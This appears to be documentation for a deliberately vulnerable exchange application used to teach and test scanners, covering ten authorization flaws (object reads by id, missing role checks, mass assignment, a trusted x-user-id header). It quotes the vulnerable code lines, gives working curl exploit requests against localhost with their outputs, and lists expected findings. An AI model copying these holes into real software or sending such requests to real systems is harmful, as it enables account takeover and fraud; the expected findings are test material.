# `ACCESS` — authorization

10 scenarios: `ACCESS-008` in `trading`, `ACCESS-002` in `trading`, `ACCESS-009` in `trading`, `ACCESS-010` in `trading`, `ACCESS-007` in `trading`, `ACCESS-001` in `accounts`, `ACCESS-003` in `accounts`, `ACCESS-004` in `accounts`, `ACCESS-005` in `accounts`, `ACCESS-006` in `notifications`.

**In `accounts`.**

Four weaknesses of the old clients' paths in `accounts`: an object read with no owner check, a role write with no role check, a profile route that takes the body as the change, and an internal route that believes a header. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

**In `notifications`.**

**Family:** `ACCESS` · **Service:** `notifications` · **Scanner:** SAST · **OWASP:** A01

One query answers whichever user the argument names: the alerts of the
service are read by id, with no check that the id is the caller's own. The
two protected ways to read alerts take the user from the caller — one from
the token, one from the entity the gateway already resolved for its own
user, or an administrator's.

## ACCESS-001 — another account by identifier, with no ownership check

### ACCESS-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `userPreferences(userId: ID!)` |
| Sink | The named account answered to any caller, in `apps/accounts/src/legacy/users-preferences.resolver.ts` |
| Flow | a user's token → any `userId` → that account's email and preferences |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: the caller's own record, no argument to name another), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: an administrator's operation) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-639, SAST |

### ACCESS-001 — student guide

An identifier in the request is a claim about *what* to read, never *who* is reading. The legacy lookup never ties the two together, so Alice's token reads Bob's record by naming Bob.

### ACCESS-001 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"query ($u: ID!) { userPreferences(userId: $u) }","variables":{"u":"u-bob"}}'
{"data":{"userPreferences":{"email":"bob@vcx.exchange","preferences":{"theme":"dark","language":"en","currency":"USD","marketingEmails":"false"}}}}
```

Bob's email and preferences, on Alice's token. `me` answers the caller's own record and has no argument that could name Bob; `user(id: "u-bob")` on Alice's token is `FORBIDDEN` — the roles guard stops a user's token before the resolver runs.

### ACCESS-001 — vulnerable and protected

| | Why |
| --- | --- |
| `userPreferences(userId)` (vulnerable) | The identifier decides what is read; nothing checks whose it is |
| `me` (protected) | The record is the caller's own; there is no way to ask for another account |
| `user(id)` (protected) | An administrator's operation; a user's token is refused at the guard |

### ACCESS-001 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-001`: Alice's token reads Bob's email and preferences; `me` answers only Alice; `user(id)` refuses Alice's token.

## ACCESS-003 — a user's token opens an administrator's account

### ACCESS-003 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `createUserAccount(input: CreateUserInput!)` |
| Sink | No role check before creating an account with the input's `role`, in `apps/accounts/src/legacy/account-creation.resolver.ts` |
| Flow | a user's token → the input says `role: ADMIN` → an administrator's account exists |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`createUser` under `@Roles('ADMIN')`), `apps/accounts/src/admin/admin.controller.ts` (`POST /internal/admin/users`: roles guard and DTO) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-862, SAST |

### ACCESS-003 — student guide

Authentication is not authorization: the mutation checks that a token is present, never what the token's role is. The input carries the role of the account to create, and it is written.

### ACCESS-003 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $BOB" \
    --data-raw '{"query":"mutation ($i: CreateUserInput!) { createUserAccount(input: $i) { id email role } }","variables":{"i":{"email":"zazzles-lab-marker@vcx.exchange","displayName":"Marker Account","password":"marker-lab-only","role":"ADMIN"}}}'
{"data":{"createUserAccount":{"id":"u-c231d48b…","email":"zazzles-lab-marker@vcx.exchange","role":"ADMIN"}}}
```

The same input on Bob's token to `createUser`: `FORBIDDEN`. To `POST /internal/admin/users`: 403, the roles guard answers before the DTO is seen.

### ACCESS-003 — vulnerable and protected

| | Why |
| --- | --- |
| `createUserAccount(input)` (vulnerable) | Any token is enough, and the input's `role` is written as given |
| `createUser` (protected) | `@Roles('ADMIN')`; a user's token is refused for this input |
| `POST /internal/admin/users` (protected) | The roles guard first, then a validated DTO |

### ACCESS-003 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-003`: the marker account is created `ADMIN` on Bob's token and the counts say so; both counterparts refuse the same input.

## ACCESS-004 — the body of the legacy profile editor is the change

### ACCESS-004 — agent reference

| | |
| --- | --- |
| Operation | REST `PATCH /internal/profile` |
| Sink | The request body assigned onto the record property by property, in `apps/accounts/src/legacy/legacy-profile.controller.ts` |
| Flow | `{"displayName":…,"role":"ADMIN"}` → every property written → the caller's own role changes |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updateProfile`: a typed input), `apps/accounts/src/profile/profile.controller.ts` (`PUT /internal/profile`: the whitelist is on, fields copied by name) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-915, SAST |

### ACCESS-004 — student guide

The old editor sent "the fields that changed", and the server wrote the change it was handed. A property the caller was never meant to set travels the same road as a display name, because nothing names the fields this route may write.

### ACCESS-004 — exploit lab

```console
$ curl -s -X PATCH $RELAY/internal/profile -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    -d '{"displayName":"Alice Patched","role":"ADMIN"}' | jq '{id, role}'
{"id":"u-alice","role":"ADMIN"}
```

Alice's own record says she is an administrator, and the answer said so. The same body to `PUT /internal/profile`: 400 — the DTO declares two fields and a third is an error. To `updateProfile`: `BAD_USER_INPUT` — `role` is not a field of the input, so it is refused, not written.

### ACCESS-004 — vulnerable and protected

| | Why |
| --- | --- |
| `PATCH /internal/profile` (vulnerable) | The body is the change document: every property it carries is written |
| `updateProfile` (protected) | A typed input; an unknown property is refused for this payload |
| `PUT /internal/profile` (protected) | The global whitelist is on and the fields are copied by name |

### ACCESS-004 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-004`: the PATCH writes `role: ADMIN` and the store agrees (then the lab reset restores Alice); both counterparts refuse the same body.

## ACCESS-005 — a header believed as identity

### ACCESS-005 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/me` |
| Sink | `x-user-id` read and trusted as the caller, in `apps/accounts/src/legacy/legacy-me.controller.ts` |
| Flow | a local caller sets the header → the route answers the account it names, with no token at all |
| Counterparts | `apps/accounts/src/auth/auth.controller.ts` (`introspect`: the token must verify), `apps/accounts/src/users/users.controller.ts` (`GET /internal/users/lookup`: the service token decides) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-807, SAST |

### ACCESS-005 — student guide

The old gateway put the caller's id in a header after its own check, and the route behind it believed the header forever after. A header a client can set is not a credential: on the loopback the lab lives on, any process can claim any account.

### ACCESS-005 — exploit lab

```console
$ curl -s $RELAY/internal/me -H 'x-user-id: u-admin' | jq '{id, email, role}'
{"id":"u-admin","email":"admin@vcx.exchange","role":"ADMIN"}
```

The administrator's whole profile, with no credentials at all. The same header against the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/sessions/introspect \
    -H 'content-type: application/json' -H 'x-user-id: u-admin' -d '{"token":"not-a-token"}'
401
$ curl -s -o /dev/null -w '%{http_code}\n' "$RELAY/internal/users/lookup?email=admin@vcx.exchange" \
    -H 'x-user-id: u-admin'
401
```

`introspect` is closed: a token must verify first. The lookup answers the run's service token, and no header stands in for it.

### ACCESS-005 — vulnerable and protected

| | Why |
| --- | --- |
| `GET /internal/me` (vulnerable) | The header is the whole proof of identity |
| `introspect` (protected) | A closed operation; the token is verified, and this request carries none that does |
| `GET /internal/users/lookup` (protected) | Only the run's service token opens it; `x-user-id` is not a credential |

### ACCESS-005 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-005`: the header alone answers the administrator's profile; both counterparts answer 401 to the same headers.

## ACCESS-006 — another user's alerts by id

### ACCESS-006 — agent reference

- **Scenario:** ACCESS-006, a user's object read by another user, by id.
- **Source:** `apps/notifications/src/alerts/alerts-of.resolver.ts`
- **Operation:** GraphQL `alertsOf(userId: ID!): [Alert!]!`, user.
- **Sink:** `this.alerts.of(userId)` — the user is whichever the argument names, not the caller.
- **Flow:** `userId = "u-bob"` in Alice's request → the repository's `findByUserId("u-bob")` → Bob's alerts answered to Alice.
- **Counterparts:** `apps/notifications/src/alerts/alerts.resolver.ts` (`alerts`: the user comes from the token, and there is no `userId` argument), `apps/notifications/src/alerts/user-alerts.resolver.ts` (`User.alerts`: the caller's own user, or any user for an `ADMIN`).
- **Tests:** `apps/notifications/test/scenarios/access.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an object-level read whose user comes from the request and is never compared with the caller.

### ACCESS-006 — student guide

The line (`apps/notifications/src/alerts/alerts-of.resolver.ts`):

```ts
return this.alerts.of(userId); // ACCESS-006 / CWE-639: the user is whichever the argument names, so one user's alerts are answered to another
```

The service's own way of reading alerts — `alerts` — never sees a user id:
the guard puts the caller's id in the resolver, and the repository is asked
for that id and no other. `alertsOf` takes the id as an argument, for a
client that already knows whose alerts it wants, and hands it to the same
repository unchanged. Authorization lives in the word "own": nothing about
the token crosses into the query, so "Bob's alerts" and "alerts" are the
same request to it. The id is not a secret — it is in every delivery and
every federation representation — and knowing it is the whole attack. The
author's belief: "a user asking for another user's alerts is only reading
public markets."

### ACCESS-006 — exploit lab

Run on 2026-11-27 against the service alone on `127.0.0.1:3103`. `$A` is
Alice's token; Bob's seeded alert is `ETH-USD BELOW 3000.00`:

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"query { alertsOf(userId: \"u-bob\") { userId symbol direction threshold label } }"}'
{"data":{"alertsOf":[{"userId":"u-bob","symbol":"ETH-USD","direction":"BELOW","threshold":"3000.00","label":"Buy the dip"}]}}
```

Alice, named nowhere in the answer's data, is answered Bob's alert by
naming his id. The same id through the counterparts:

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d '{"query":"{ alerts { userId symbol } }"}'
{"data":{"alerts":[{"userId":"u-alice","symbol":"BTC-USD"}]}}

$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"query($r: [_Any!]!) { _entities(representations: $r) { ... on User { alerts { userId symbol } } } }","variables":{"r":[{"__typename":"User","id":"u-bob"}]}}'
{"errors":[{"message":"These fields are answered for the caller's own user, or by an administrator", … "extensions":{"code":"FORBIDDEN" …}}]}
```

her own list holds only hers, and the entity field refuses her on Bob's
representation (Bob's own token and an administrator's are answered). In
Postman: the request `ACCESS-006: another user's alerts by id`. In Burp:
send the three queries from Repeater with Alice's token.

### ACCESS-006 — vulnerable and protected

| | Operation | What it does with the same id |
| --- | --- | --- |
| Vulnerable | `alertsOf` | Answers the alerts of the user the id names, to whoever asks |
| Counterpart 1 | `alerts` | The user comes from the token; there is no `userId` argument to hand the id to (`GRAPHQL_VALIDATION_FAILED`) |
| Counterpart 2 | `User.alerts` | The caller's own representation, or any for an `ADMIN`; Alice on Bob's is `FORBIDDEN` |

**Scoped claim.** Each counterpart defeats this flaw for identical input:
the id that reads Bob's alerts on the first cannot reach the repository
through either of them — one has no argument for it, the other compares
the representation's user with the caller. The claim is not that these two
queries make the service's object-level access safe; only that this id
reads no other user's alerts through them.

### ACCESS-006 — tests

`apps/notifications/test/scenarios/access.int-spec.ts`, describe
`ACCESS-006: another user's alerts by id`. One attacker value — `u-bob`,
in Alice's requests:

- **The exploit:** `alertsOf` answers Bob's alert to Alice: his `userId`,
  `symbol`, `direction` and `threshold`.
- **Counterpart 1:** `alerts` answers only alerts whose `userId` is
  Alice's, Bob's is absent, and a `userId` argument is refused
  (`GRAPHQL_VALIDATION_FAILED`).
- **Counterpart 2:** `User.alerts` answers `FORBIDDEN` for Alice on Bob's
  representation, and answers Bob's own token and an administrator's.

**In `trading`.**

**Family:** `ACCESS` · **Service:** `trading` · **Scanner:** SAST · **OWASP:** A01 · API1, API3, API5

Five operations that answer to a token without settling what the token's holder
may do: another user's object by id (ACCESS-002, ACCESS-008), an administrator's
operation on a user's token (ACCESS-007, ACCESS-009), and a body merged into an
entity as it arrived (ACCESS-010).

Every reproduction below was run on 2026-11-27 against the service alone, on
`127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is
Alice's token. The store was reset to the fake data between reproductions.

## ACCESS-008 — `walletOf`: another user's balances by id

The line (`apps/trading/src/wallets/wallet-of.resolver.ts`):

```ts
// ACCESS-008 / CWE-639: the caller names any user, and the balances answer to the token alone
@Args('userId', { type: () => ID }) userId: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc008.json   # userId "u-erin"
{"data":{"walletOf":[{"asset":"BTC","balance":"0.00000000"},{"asset":"DOGE","balance":"0.00000000"},
 {"asset":"ETH","balance":"0.00000000"},{"asset":"SOL","balance":"0.00000000"},
 {"asset":"USD","balance":"500.00"},{"asset":"XRP","balance":"0.00000000"}]}}
```

Alice gained Erin's six balances, her 500.00 dollars among them.

**Counterpart 1 — `wallet` and `ledger`.** No `userId` argument exists on either:
both answer the caller's own data (Alice's `10000.00`, her one deposit entry).

**Counterpart 2 — `wallets(userId: ID!)`, `@Roles('ADMIN')`.** The identical
payload is refused: `FORBIDDEN`, `"This operation needs one of the roles ADMIN"`.

## ACCESS-002 — `orderDetails`: no ownership check

The line (`apps/trading/src/orders/order-details.resolver.ts`):

```ts
// ACCESS-002 / CWE-639: the order is returned with no check of who placed it
const order = await this.orders.byId(whole);
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc002.json   # id "2"
{"data":{"orderDetails":{"id":"2","userId":"u-bob","memo":"stop loss above entry","limitPrice":"66000.00"}}}
```

Alice gained Bob's order: its id, his note, the price he named.

**Counterpart 1 — `order(id: ID!)`.** The repository answers, then the order is
checked against the caller: `FORBIDDEN`, `"An order is read by the user who
placed it"`.

**Counterpart 2 — `User.orders` through `_entities`.** The reference names a
user the caller did not choose; the field resolver checks it: `FORBIDDEN`.

## ACCESS-009 — `creditWallet`: a user credits a wallet

The line (`apps/trading/src/wallets/credit-wallet.resolver.ts`):

```ts
// ACCESS-009 / CWE-862: the amount is checked, the role is not; a signed-in caller is enough
@Args('userId', { type: () => ID }) userId: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc009.json
# {"userId": "u-alice", "amount": "500.00"}
{"data":{"creditWallet":[...,{"asset":"USD","balance":"10500.00"},...]}}
```

Alice credited herself five hundred dollars on her own token.

**Counterpart 1 — `deposit(userId, amount)`, `@Roles('ADMIN')`.** The identical
payload: `FORBIDDEN`, `"This operation needs one of the roles ADMIN"`.

**Counterpart 2 — `POST /internal/admin/deposits`.** The roles guard refuses the
same body: HTTP `403`.

## ACCESS-010 — `PATCH /internal/orders/:id`: mass assignment

The line (`apps/trading/src/orders/orders-patch.controller.ts`):

```ts
// ACCESS-010 / CWE-915: the body is merged into the entity as it arrived; status and userId are properties of it
Object.assign(order, body);
```

```console
$ curl -s -X PATCH $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-bob",...,"memo":"patched by the scenario","status":"FILLED",...}}

$ # read back through orderDetails:
{"data":{"orderDetails":{"id":"1","userId":"u-bob","memo":"patched by the scenario","status":"FILLED"}}}
```

Alice's OPEN order became Bob's FILLED order: two writes the route never
offered, from one body.

**Counterpart 1 — `updateOrder(input: UpdateOrderInput!)`.** `UpdateOrderInput`
declares `memo` alone, so the schema itself refuses the payload:
`BAD_USER_INPUT`, `"Variable \"$input\" got invalid value … Field \"status\" is
not defined by type \"UpdateOrderInput\""`.

**Counterpart 2 — `PUT /internal/orders/:id`.** The identical body answers
`200`, and only the memo is written — the field is read by name and nothing else
of the body is read:

```console
$ curl -s -X PUT $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-alice",...,"memo":"patched by the scenario","status":"OPEN",...}}
```

`OPEN` and `u-alice` stay.

## ACCESS-007 — `setReferencePrice`: a user moves a market

The line (`apps/trading/src/markets/set-reference-price.resolver.ts`):

```ts
// ACCESS-007 / CWE-862: no role check; any signed-in caller moves the price a market fills at
@Args('price', { type: () => DecimalScalar }) price: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007.json
# {"symbol": "BTC-USD", "price": "1.00"}
{"data":{"setReferencePrice":{"symbol":"BTC-USD","referencePrice":"1.00"}}}

$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007buy.json
# a market buy of 1 BTC, which fills at the reference price
{"data":{"placeOrder":{"id":"11","status":"FILLED","limitPrice":"1.00"}}}

$ curl -s $URL/graphql ... '{ wallet { asset balance } }'
[{"asset":"BTC","balance":"1.00000000"},...,{"asset":"USD","balance":"9999.00"},...]
```

One whole bitcoin for one dollar: the price a market fills at moved on a user's
token, and the buy that followed it paid the price Alice chose.

**Counterpart 1 — `tickPrices`, `@Roles('ADMIN')`.** `FORBIDDEN`, `"This
operation needs one of the roles ADMIN"`.

**Counterpart 2 — `POST /internal/admin/prices/tick`.** The roles guard refuses:
HTTP `403`.

## The tests

`apps/trading/test/scenarios/access.int-spec.ts` — one `describe` per scenario,
one payload per `describe`, sent as written to the vulnerable operation and to
each protected counterpart. The Postman collection `postman/trading/` carries
one request per scenario in its `ACCESS` folder (the PATCH and the two REST
refusals included).

## Scope of the counterparts

Each counterpart claim is scoped: this operation, receiving this payload,
refuses it for this reason. Nothing here says any operation is secure in
general.
